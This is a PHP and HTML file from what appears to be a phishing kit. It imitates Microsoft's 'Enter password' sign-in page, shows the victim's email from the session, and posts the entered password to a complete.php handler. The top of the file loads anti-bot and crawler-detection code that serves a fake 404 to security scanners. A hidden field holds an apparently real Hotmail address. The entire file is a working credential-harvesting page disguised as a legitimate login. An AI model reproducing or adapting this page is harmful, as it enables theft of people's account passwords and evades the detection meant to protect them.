<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    }
    include '../../crawlerdetect.php'; 
$useremail = $_SESSION['email'];

$ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['value']; 

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">

<script>
function empty() {
	var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").classList.add("has-error");
		document.getElementById("password_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
	var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").classList.remove("has-error");
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<base href=".">

<title>Sign in to your Microsoft-account</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">

<link rel="shortcut icon" href="password_files/favicon.ico">

<link rel="stylesheet" title="Converged_v2" type="text/css"  href="password_files/Converged_v21033.css">

<style type="text/css"></style>
<style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;password_files/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;password_files/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> 

<form name="f1" id="i0281" spellcheck="false" method="post" autocomplete="off" action="complete.php?value=<?php echo $_SESSION['value'];  ?>" onsubmit="return empty()"><!-- ko if: svr.bD --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.g,
            showFooterLinks: true,
            useWizardBehavior: svr.ag,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.aB --><!-- /ko --> <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    &#39;app&#39;: $loginPage.backgroundLogoUrl(),
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox }"> <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }"></div><!-- ko if: isRequestPending --><!-- /ko --><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27949.1/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27949.1/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="password_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.bV && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn } }"><!--  --> <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }"><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.G) --> <div data-bind="css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }"> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
            params: {
                pawnIconId: svr.bg,
                userTileUrl: svr.a9,
                displayName: sharedData.displayName || svr.G,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39;,
            &#39;aria-describedby&#39;: backButtonDescribedBy,
            &#39;aria-label&#39;: str[&#39;CT_HRD_STR_Splitter_Back&#39;] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.BR --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://auth.gfx.ms/16.000.27949.1/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="https://auth.gfx.ms/16.000.27949.1/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="password_files/arrow_left.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.BR --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title=""><?php echo $useremail; ?></div><!-- ko ifnot: svr.H --><!-- /ko --> </div></div> </div><!-- /ko --> <div class="pagination-view has-identity-banner" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.G),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.U === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value="azrael666666@hotmail.com"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.ag ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> 
							
							<div id="password_error" ><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.N, click: resetPassword_onClick } }">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="#">reset it now.</a></div><!-- /ko --> </div>

				<div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="password" type="password" id="password" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { &#39;has-error&#39;: passwordTextbox.error }" placeholder="password" onblur="change()"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.Z && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.BX, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.B1 --><!-- /ko --><!-- ko if: svr.A5 !== false && !svr.B1 && !tenantBranding.KeepMeSignedInDisabled --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.d &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.N, click: resetPassword_onClick">forgot  password?
</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                        params: {
                            serverData: svr,
                            availableCreds: availableCreds,
                            currentCred: 1 },
                        event: {
                            switchView: onSwitchView } } --><div data-bind="css: { &#39;form-group&#39;: !isMenuLink }" class="form-group"><!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --> </div><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div><div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.g,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.g &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.H },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.BX, &#39;button-container&#39;: svr.BX }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.BX,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.BX,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.BX) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div> </div><!-- ko if: newSessionMessage() && !svr.a7 --><!-- /ko --><!-- ko if: svr.a7 && newSession() --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value=""> <input type="hidden" name="ctx" data-bind="value: ctx" value=""> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value=""> <input type="hidden" id="i0327" data-bind="attr: { name: svr.bR }, value: flowToken" name="PPFT" value="Df!KDk6*R9zC2MbJfCPU4IaRkMnqoLeIcWQaZ8hDN2FSdWLIOSD0yts1wqvcNQACs6FJD6gymYIkcOKH0o0lahAa7QjB!aisSCmmEzYGxKBzA4kArD*FsgRofSMoq!FOgnlFhp1Fn*UhbaDk*7wk9BnuxM*2tdCrTaSHoIJs*beDBboDSnUxqxKsH5dzHu0BcPMBo5FICxEQDzKW3lkkaoaSN93x*E1ii9HOU*x8J7q27Flu4OonfN1QFUu48pgQGfBYJUS1wOQv94fdPqXEzCA$"> <input type="hidden" name="PPSX" data-bind="value: svr.bT" value="PassportR"> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.W" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.aB ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess" value="__ConvergedLoginPaginatedStrings|1,__OldConvergedLogin_PCore|1,"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.bU">©2020 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        hasFocus: focusMoreInfo()" aria-label="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27949.1/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://auth.gfx.ms/16.000.27949.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="password_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27949.1/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://auth.gfx.ms/16.000.27949.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="password_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> 
		
		</div></body></html>